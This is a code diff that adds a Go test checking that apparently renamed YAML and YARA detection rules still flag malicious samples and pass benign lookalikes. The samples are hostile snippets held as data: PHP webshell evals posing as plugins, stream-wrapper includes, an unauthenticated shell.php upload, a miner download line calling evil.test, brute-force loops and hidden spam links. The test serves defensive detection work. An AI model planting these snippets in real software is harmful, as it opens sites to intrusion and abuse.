@@ -1180,6 +1180,236 @@ $out = shell_exec($cmd);`,
 	}
 }
 
+func TestRenamedYARARuleClaims(t *testing.T) {
+	_, thisFile, _, ok := runtime.Caller(0)
+	if !ok {
+		t.Fatal("runtime.Caller failed")
+	}
+	configsDir := filepath.Join(filepath.Dir(thisFile), "..", "..", "configs")
+
+	yaraScanner, err := csmyara.NewScanner(configsDir)
+	if err != nil {
+		t.Fatalf("loading YARA rules: %v", err)
+	}
+	yamlScanner := signatures.NewScanner(configsDir)
+	if err := yamlScanner.LoadError(); err != nil {
+		t.Fatalf("loading YAML rules: %v", err)
+	}
+
+	tests := []struct {
+		name        string
+		yamlRule    string
+		yaraRule    string
+		ext         string
+		sample      string
+		wantYAMLHit bool
+		wantYARAHit bool
+	}{
+		{
+			name:        "stream wrapper rename",
+			yamlRule:    "dropper_php_stream_wrapper",
+			yaraRule:    "dropper_stream_wrapper_abuse",
+			ext:         ".php",
+			sample:      `<?php require('zip://payload.zip#shell.php');`,
+			wantYAMLHit: true,
+			wantYARAHit: true,
+		},
+		{
+			name:        "stream wrapper filter arm",
+			yamlRule:    "dropper_php_stream_wrapper",
+			yaraRule:    "dropper_stream_wrapper_abuse",
+			ext:         ".php",
+			sample:      `<?php include('php://filter/convert.base64-decode/resource=payload');`,
+			wantYAMLHit: true,
+			wantYARAHit: true,
+		},
+		{
+			name:        "stream wrapper expect arm",
+			yamlRule:    "dropper_php_stream_wrapper",
+			yaraRule:    "dropper_stream_wrapper_abuse",
+			ext:         ".php",
+			sample:      `<?php require('expect://id');`,
+			wantYAMLHit: true,
+			wantYARAHit: true,
+		},
+		{
+			name:        "htaccess handler rename",
+			yamlRule:    "exploit_htaccess_handler",
+			yaraRule:    "exploit_htaccess_handler_abuse",
+			ext:         ".htaccess",
+			sample:      "AddHandler application/x-httpd-php .jpg\n",
+			wantYAMLHit: true,
+			wantYARAHit: true,
+		},
+		{
+			name:        "CryptoLoot rename",
+			yamlRule:    "miner_cryptoloot_js",
+			yaraRule:    "miner_cryptoloot",
+			ext:         ".js",
+			sample:      `const minerURL = 'https://crypto-loot.com/lib/miner.js';`,
+			wantYAMLHit: true,
+			wantYARAHit: true,
+		},
+		{
+			name:        "CryptoLoot brand rename",
+			yamlRule:    "miner_cryptoloot_js",
+			yaraRule:    "miner_cryptoloot",
+			ext:         ".js",
+			sample:      `const miner = new cryptoloot.Anonymous('site-key');`,
+			wantYAMLHit: true,
+			wantYARAHit: true,
+		},
+		{
+			name:        "miner shell rename",
+			yamlRule:    "miner_shell_script",
+			yaraRule:    "miner_shell_downloader",
+			ext:         ".sh",
+			sample:      "#!/bin/sh\ncurl${IFS}https://evil.test/xmrig\n",
+			wantYAMLHit: true,
+			wantYARAHit: true,
+		},
+		{
+			name:        "eval decoder rename",
+			yamlRule:    "php_eval_decode_chain",
+			yaraRule:    "php_eval_base64_chain",
+			ext:         ".php",
+			sample:      `<?php eval(gzuncompress(base64_decode($payload)));`,
+			wantYAMLHit: true,
+			wantYARAHit: true,
+		},
+		{
+			name:     "brute force credential loop",
+			yamlRule: "network_brute_force",
+			yaraRule: "network_brute_force_tool",
+			ext:      ".php",
+			sample: `<?php
+foreach ($passwords as $pass) {
+    $socket = fsockopen($host, 22);
+}`,
+			wantYAMLHit: true,
+			wantYARAHit: true,
+		},
+		{
+			name:     "brute force list consumer",
+			yamlRule: "network_brute_force",
+			yaraRule: "network_brute_force_tool",
+			ext:      ".php",
+			sample: `<?php
+while ($passwords) {
+    $pass = array_shift($passwords);
+    $socket = fsockopen($host, 22);
+}`,
+			wantYAMLHit: true,
+			wantYARAHit: true,
+		},
+		{
+			name:     "brute force hardening",
+			yamlRule: "network_brute_force",
+			yaraRule: "network_brute_force_tool",
+			ext:      ".php",
+			sample: `<?php
+$passwords = get_option('stored_passwords');
+function ping_host($host) { return fsockopen($host, 443); }`,
+			wantYAMLHit: true,
+			wantYARAHit: false,
+		},
+		{
+			name:     "inline-hidden footer link",
+			yamlRule: "spam_link_injector",
+			yaraRule: "spam_wp_footer_injection",
+			ext:      ".php",
+			sample: `<?php add_action('wp_footer', function () {
+    echo '<a href="https://spam.example/" style="display:none">cheap pills</a>';
+});`,
+			wantYAMLHit: true,
+			wantYARAHit: true,
+		},
+		{
+			name:     "footer injection hardening",
+			yamlRule: "spam_link_injector",
+			yaraRule: "spam_wp_footer_injection",
+			ext:      ".php",
+			sample: `<?php add_action('wp_footer', function () {
+    echo '<style>.notice{display:none}</style><a href="https://docs.example/">Help</a>';
+});`,
+			wantYAMLHit: true,
+			wantYARAHit: false,
+		},
+		{
+			name:     "request-fed fake plugin eval",
+			yamlRule: "wp_fake_plugin_eval",
+			yaraRule: "webshell_wp_fake_plugin",
+			ext:      ".php",
+			sample: `<?php
+/* Plugin Name: Cache Helper */
+eval(base64_decode($_POST['payload']));`,
+			wantYAMLHit: true,
+			wantYARAHit: true,
+		},
+		{
+			name:     "encoded fake plugin eval",
+			yamlRule: "wp_fake_plugin_eval",
+			yaraRule: "webshell_wp_fake_plugin",
+			ext:      ".php",
+			sample: `<?php
+/* Plugin Name: Cache Helper */
+eval(base64_decode('PD9waHAgZXZhbCgkX1BPU1RbJ2MnXSk7ID8+AAAA'));`,
+			wantYAMLHit: true,
+			wantYARAHit: true,
+		},
+		{
+			name:     "fake plugin eval hardening",
+			yamlRule: "wp_fake_plugin_eval",
+			yaraRule: "webshell_wp_fake_plugin",
+			ext:      ".php",
+			sample: `<?php
+/* Plugin Name: Backup Helper */
+function run_backup() {
+    $command = '/usr/bin/mysqldump --version';
+    exec($command);
+}`,
+			wantYAMLHit: true,
+			wantYARAHit: false,
+		},
+		{
+			name:     "unauthenticated fake plugin upload",
+			yamlRule: "wp_fake_plugin_upload",
+			yaraRule: "dropper_uploader_no_auth",
+			ext:      ".php",
+			sample: `<?php
+/* Plugin Name: Media Helper */
+move_uploaded_file($_FILES['payload']['tmp_name'], '/uploads/shell.php');`,
+			wantYAMLHit: true,
+			wantYARAHit: true,
+		},
+		{
+			name:     "fake plugin upload hardening",
+			yamlRule: "wp_fake_plugin_upload",
+			yaraRule: "dropper_uploader_no_auth",
+			ext:      ".php",
+			sample: `<?php
+/* Plugin Name: Media Helper */
+session_start();
+move_uploaded_file($_FILES['image']['tmp_name'], '/uploads/image.jpg');`,
+			wantYAMLHit: true,
+			wantYARAHit: false,
+		},
+	}
+
+	for _, tc := range tests {
+		t.Run(tc.name, func(t *testing.T) {
+			yamlHit := hasSignatureRule(yamlScanner.ScanContent([]byte(tc.sample), tc.ext), tc.yamlRule)
+			yaraHit := hasRepositoryYaraRule(yaraScanner.ScanBytes([]byte(tc.sample)), tc.yaraRule)
+			if yamlHit != tc.wantYAMLHit {
+				t.Errorf("%s outcome = %t, want %t", tc.yamlRule, yamlHit, tc.wantYAMLHit)
+			}
+			if yaraHit != tc.wantYARAHit {
+				t.Errorf("%s outcome = %t, want %t", tc.yaraRule, yaraHit, tc.wantYARAHit)
+			}
+		})
+	}
+}
+
 func hasSignatureRule(matches []signatures.Match, name string) bool {
 	for _, match := range matches {
 		if match.RuleName == name {
